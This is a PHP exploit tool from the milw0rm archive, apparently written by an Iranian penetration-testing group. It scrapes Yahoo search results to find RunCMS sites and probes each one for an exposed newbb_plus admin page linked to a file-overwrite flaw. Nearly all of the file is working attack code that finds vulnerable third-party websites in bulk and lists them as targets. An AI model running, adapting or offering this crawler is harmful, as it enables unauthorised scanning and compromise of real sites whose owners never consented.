<?php
########################## WwW.BugReport.ir ###########################################
#
#      AmnPardaz Security Research & Penetration Testing Group
#
# Title: RunCms`s Bug Yahoo! Crawler
# Vendor: http://www.runcms.org/
# Vulnerable Version: RunCMS 1.6 Halloween, 1.5.x (prior versions also may be affected)
# Exploitation: Remote with browser
# Coded By: trueend5 (trueend5 yahoo com)
#######################################################################################
# Leaders : Shahin Ramezany & Sorush Dalili
# Team Members: Alireza Hasani ,Amir Hossein Khonakdar, Hamid Farhadi
# Security Site: WwW.BugReport.ir - WwW.AmnPardaz.Com
# Country: Iran
# Contact : admin@bugreport.ir
######################## Bug Description ###########################
?>

<html dir="ltr">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>RunCms`s Bug Yahoo! Crawler</title>
<style type="text/css" media="screen">
body {
	font-size: 10px;
	font-family: verdana;
}
INPUT {
	BORDER-TOP-WIDTH: 1px; FONT-WEIGHT: bold; BORDER-LEFT-WIDTH: 1px; FONT-SIZE: 10px; BORDER-LEFT-COLOR: #D50428; BACKGROUND: #590009; BORDER-BOTTOM-WIDTH: 1px; BORDER-BOTTOM-COLOR: #D50428; COLOR: #00ff00; BORDER-TOP-COLOR: #D50428; FONT-FAMILY: verdana; BORDER-RIGHT-WIDTH: 1px; BORDER-RIGHT-COLOR: #D50428
}
</style>
</head>
<body dir="ltr" alink="#00ff00"  bgcolor="#000000" link="#00c000" text="#008000" vlink="#00c000">
<form action="?" method="post">
Run the Exploit And Use the results of "Yahoo! Search Engine" starting From the page:
<input type="text" name="StartPage" value="1" size="3">
including
<input type="text" name="PerPage" value="100" size="3">
results per page.<BR><BR>
<input type="submit" name="Start" value="Start">
</form>
<?php

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 2);
ob_implicit_flush (1);


function sendpacket($packet)
{
	global $host, $html;
	$port  = 80;
		
	$ock=fsockopen(gethostbyname($host),$port);
    if ($ock)
	{
		fputs($ock,$packet);
		$html='';
		while (!feof($ock))
		{
			$html.=fgets($ock);
		}
		fclose($ock);
		// echo nl2br(htmlentities($html));
    }else echo '<BR>No response from '.htmlentities($host).'<BR>';
}

	// Start
	if(isset($_POST['Start'] ,$_POST['StartPage'] ,$_POST['PerPage']))
	{
		$StartPage = ((intval($_POST['StartPage'])) > 0) ? intval($_POST['StartPage']) : 1;
		$PerPage   = ((intval($_POST['PerPage'])) <= 100) ? intval($_POST['PerPage']) : 100;
		if (($StartPage*$PerPage) > 1000)
		{
			echo "Yahoo! Search doesn't show More than 1000 Results per query"."<BR>";
			die();
		}
		echo 'Trying to obtain URLs Which are suspected to "newbb_plus disclaimer.php
		 File Overwrite" ...'.'<BR>';
		
		$Yahoo     = "search.yahoo.com";
		$S         = $StartPage;
		$P         = $PerPage;
		
		for ($S; $S*$P < 1000; $S++)
		{
			$host    = $Yahoo;
			$B       = ($S == 1) ? '' : '&b='.((($S-1)*$P)+1);
			$Query   = "/search?p=runcms+inurl%3A%22%2Fmodules%2Fnews%2F%22&n=$P&ei=utf-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=url&vd=all&vst=0&vf=all&vm=p&fl=0&xargs=0&pstart=1".$B;
			
			$packet  = "GET ".$Query." HTTP/1.1\r\n";
			$packet .= "User-Agent: Shareaza v1.x.x.xx\r\n";
			$packet .= "Host: ".$host."\r\n";
			$packet .= "Connection: Close\r\n\r\n";
			sendpacket($packet);
			if(stristr($html , '403 Forbidden') === false 
			&& stristr($html , '302 Moved') === false)
			{
				echo '<HR><BR><CENTER>Obtained URLs From Page:'.($S).'<CENTER><BR>';
				$Pattern = '/href="http:\/\/?([^\/]+)?(\/[a-zA-Z]+)?(\/modules\/news\/)/i';
				preg_match_all($Pattern, $html, $Matches);
				$TotalLinks = count($Matches[1]);
				echo "In Progress<BR>";
				for ($I=0; $I < $TotalLinks; $I++)
				{
					echo ".";
					if ($Matches[2][$I] == '')
					{
						$Path = "/modules/newbb_plus/admin/forum_config.php";
					}else 
					$Path    = $Matches[2][$I]."/modules/newbb_plus/admin/forum_config.php";
					$host    = $Matches[1][$I];
					$packet  = "GET ".$Path." HTTP/1.1\r\n";
					$packet .= "User-Agent: Shareaza v1.x.x.xx\r\n";
					$packet .= "Host: ".$host."\r\n";
					$packet .= "Connection: Close\r\n\r\n";
					sendpacket($packet);
					if(stristr($html , '_MD_A_CONFIGFORUM') !== false)
					{
						echo "<BR><A href='http://".$host.$Path."'>".$host.$Path."</A><BR>";
					}					
				}
			}else 
			{
				echo '<BR>'.'Yahoo! finds out that this in an automated request
				 from a malware! So try again after awhile!';
				die();
			}
		}
	}
?>
</body>
</html>

# milw0rm.com [2007-11-25]